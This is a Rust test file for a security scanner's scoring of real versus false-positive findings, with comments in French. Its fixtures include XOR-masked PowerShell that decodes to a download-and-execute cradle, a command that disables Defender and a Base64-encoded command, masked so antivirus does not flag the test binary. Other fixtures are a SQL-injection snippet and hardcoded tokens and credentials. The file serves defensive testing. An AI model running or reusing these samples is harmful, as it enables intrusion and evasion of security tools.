//! Tests de la probabilité vrai problème / faux positif (scan réel d'un projet
//! temporaire, aucun appel réseau).

use super::*;
use crate::engine::scanner::scan_tree;
use crate::models::ScanConfig;
use std::sync::atomic::AtomicBool;

fn project(files: &[(&str, &str)]) -> ScanResult {
    let dir = std::env::temp_dir().join(format!("secuscan_conf_{}", uuid::Uuid::new_v4()));
    for (name, content) in files {
        let p = dir.join(name);
        std::fs::create_dir_all(p.parent().unwrap()).unwrap();
        std::fs::write(p, content).unwrap();
    }
    let mut r = scan_tree(&dir, &dir.display().to_string(), &ScanConfig::default(), &AtomicBool::new(false), &|_| {});
    apply(&mut r);
    let _ = std::fs::remove_dir_all(&dir);
    r
}

// Échantillons « malveillants » masqués par XOR 0x5A et démasqués à l'exécution :
// aucune commande d'attaque n'apparaît en clair dans le binaire de test, sinon
// l'antivirus peut le mettre en quarantaine. Découper en fragments ne suffit pas :
// le compilateur range les littéraux côte à côte et recompose la chaîne.
const MASK: u8 = 0x5A;
/// Téléchargement + exécution en mémoire (« download cradle ») PowerShell.
const CRADLE: &[u8] = b"\x13\x1f\x02\x7a\x72\x14\x3f\x2d\x77\x15\x38\x30\x3f\x39\x2e\x7a\x14\x3f\x2e\x74\x0d\x3f\x38\x19\x36\x33\x3f\x34\x2e\x73\x74\x1e\x35\x2d\x34\x36\x35\x3b\x3e\x09\x2e\x28\x33\x34\x3d\x72\x7d\x32\x2e\x2e\x2a\x60\x75\x75\x22\x74\x3f\x22\x3b\x37\x2a\x36\x3f\x75\x3b\x7d\x73\x50";
/// Defender coupé, puis le cradle, puis une commande encodée en Base64.
const PS1: &[u8] = b"\x09\x3f\x2e\x77\x17\x2a\x0a\x28\x3f\x3c\x3f\x28\x3f\x34\x39\x3f\x7a\x77\x1e\x33\x29\x3b\x38\x36\x3f\x08\x3f\x3b\x36\x2e\x33\x37\x3f\x17\x35\x34\x33\x2e\x35\x28\x33\x34\x3d\x7a\x7e\x2e\x28\x2f\x3f\x50\x13\x1f\x02\x7a\x72\x14\x3f\x2d\x77\x15\x38\x30\x3f\x39\x2e\x7a\x14\x3f\x2e\x74\x0d\x3f\x38\x19\x36\x33\x3f\x34\x2e\x73\x74\x1e\x35\x2d\x34\x36\x35\x3b\x3e\x09\x2e\x28\x33\x34\x3d\x72\x7d\x32\x2e\x2e\x2a\x60\x75\x75\x22\x74\x3f\x22\x3b\x37\x2a\x36\x3f\x75\x3b\x7d\x73\x50\x2a\x35\x2d\x3f\x28\x29\x32\x3f\x36\x36\x7a\x77\x1f\x34\x39\x35\x3e\x3f\x3e\x19\x35\x37\x37\x3b\x34\x3e\x7a\x09\x0b\x18\x1c\x1b\x1c\x3d\x1b\x13\x1b\x1b\x35\x1b\x1f\x6e\x1b\x00\x0b\x18\x69\x1b\x19\x6a\x1b\x0e\x2d\x18\x33\x1b\x1d\x35\x1b\x00\x0b\x18\x30\x1b\x12\x0b\x1b\x50";

fn unmask(b: &[u8]) -> String {
    String::from_utf8(b.iter().map(|c| c ^ MASK).collect()).expect("échantillon masqué en UTF-8")
}

fn evil_cradle() -> String {
    unmask(CRADLE)
}

fn evil_ps1() -> String {
    unmask(PS1)
}

fn in_file(v: &Vulnerability, file: &str) -> bool {
    v.file_path.replace('\\', "/").ends_with(file)
}

fn find<'a>(r: &'a ScanResult, file: &str, title_part: &str) -> &'a Vulnerability {
    r.vulnerabilities
        .iter()
        .find(|v| in_file(v, file) && v.title.contains(title_part))
        .unwrap_or_else(|| {
            panic!(
                "{file} / {title_part} absent : {:?}",
                r.vulnerabilities.iter().map(|v| (&v.file_path, &v.title)).collect::<Vec<_>>()
            )
        })
}

/// Cas demandé : injection SQL réelle, clé en dur dans `tests/`, valeur factice.
#[test]
fn injection_sql_cle_de_test_et_valeur_factice() {
    let token = "GITHUB_TOKEN=ghp_R8x2mQ7vLk3Pz9Tn4Wd6Yb1Hc5Js0Fa2Ge7K\n";
    let r = project(&[
        (
            "app/views.py",
            "def get(request):\n    cur.execute(f\"SELECT * FROM users WHERE id = {request.GET['id']}\")\n",
        ),
        ("config/prod.env", token),
        ("tests/fixtures/ci.env", token),
        ("config/app.env", "password = \"changeme_please\"\n"),
    ]);
    for v in &r.vulnerabilities {
        println!("{:>3} % réel | {:<55} | {} | {:?}", v.confidence, v.title, v.file_path, v.confidence_factors);
    }

    let sqli = find(&r, "app/views.py", "Injection SQL");
    assert!(sqli.confidence >= 55, "SQLi sur entrée utilisateur : {} {:?}", sqli.confidence, sqli.confidence_factors);
    assert!(sqli.confidence_factors.iter().any(|f| f.delta > 0), "facteur « entrée utilisateur » attendu");

    let prod = find(&r, "config/prod.env", "GitHub");
    let test = find(&r, "tests/fixtures/ci.env", "GitHub");
    assert!(prod.confidence >= 75, "vraie clé : {}", prod.confidence);
    assert_eq!(prod.confidence as i16 - test.confidence as i16, 35, "même clé, -35 points en dossier de test");
    assert!(test.confidence < 55, "clé dans tests/ ne doit pas être « réelle » : {}", test.confidence);

    let fake = find(&r, "config/app.env", "Mot de passe");
    assert!(fake.confidence < 12, "valeur factice : {} {:?}", fake.confidence, fake.confidence_factors);
    assert_eq!(fake.confidence_label, "Faux positif très probable");

    for v in &r.vulnerabilities {
        assert_eq!(v.confidence as u16 + v.false_positive as u16, 100);
        assert!(!v.what_it_does.is_empty() && !v.why_real.is_empty() && !v.why_false_positive.is_empty());
    }
    let a = &r.assessment;
    assert_eq!(a.likely_real + a.to_review + a.likely_false_positive, r.vulnerabilities.len());
    assert!(a.likely_real >= 2 && a.likely_false_positive >= 1, "{a:?}");
    assert_eq!(a.malware_probability, 0, "aucun script ni binaire malveillant");
}

/// Un dossier parent nommé « examples » ne doit pas rendre tout le projet « exemple ».
#[test]
fn chemin_relatif_a_la_racine() {
    assert_eq!(relative_path(r"C:\examples\proj\src\a.py", r"C:\examples\proj"), "src/a.py");
    assert_eq!(relative_path("/home/u/tests/p/x.env", "/home/u/tests/p/"), "x.env");
}

#[test]
fn script_malveillant_vs_installeur() {
    let r = project(&[
        (
            "evil.ps1",
            evil_ps1().as_str(),
        ),
        ("install.sh", "#!/bin/sh\ncurl -fsSL https://sh.rustup.rs | sh\n"),
    ]);
    assert!(r.assessment.malware_probability >= 70, "{}", r.assessment.malware_probability);
    let inst: Vec<_> = r.vulnerabilities.iter().filter(|v| in_file(v, "install.sh")).collect();
    assert!(inst.iter().all(|v| v.confidence < 30), "{:?}", inst.iter().map(|v| (&v.title, v.confidence)).collect::<Vec<_>>());
    // Les deux scripts sont candidats à la réputation en ligne (empreintes).
    assert_eq!(r.intel_candidates.len(), 2);
}

#[test]
fn projet_propre() {
    let r = project(&[("main.rs", "fn main() { println!(\"bonjour\"); }\n")]);
    assert_eq!(r.vulnerabilities.len(), 0);
    assert_eq!(r.assessment.malware_probability, 0);
}

#[test]
fn tous_les_exports() {
    let r = project(&[
        ("config/prod.env", "DB=postgres://admin:S3cr3tPass@db.internal:5432/app\n"),
        ("evil.ps1", evil_cradle().as_str()),
    ]);
    assert!(!r.vulnerabilities.is_empty());
    let md = crate::export::to_markdown(&r);
    assert!(md.contains("Probabilité de faux positif") && md.contains("Calcul du pourcentage"));
    let txt = crate::export::to_txt(&r);
    assert!(txt.lines().all(|l| l.chars().count() <= 100), "ligne TXT trop longue");
    let html = crate::export::to_html(&r);
    assert!(html.contains("</html>") && !html.contains("<script"));
    let pdf = crate::export::to_pdf(&r);
    assert!(pdf.starts_with(b"%PDF") && pdf.ends_with(b"%%EOF\n"));
    let csv = crate::export::to_csv(&r);
    assert!(csv.lines().next().unwrap().contains("% réel"));
    let back: ScanResult = serde_json::from_str(&crate::export::to_json(&r).unwrap()).unwrap();
    assert_eq!(back.vulnerabilities[0].confidence, r.vulnerabilities[0].confidence);
}
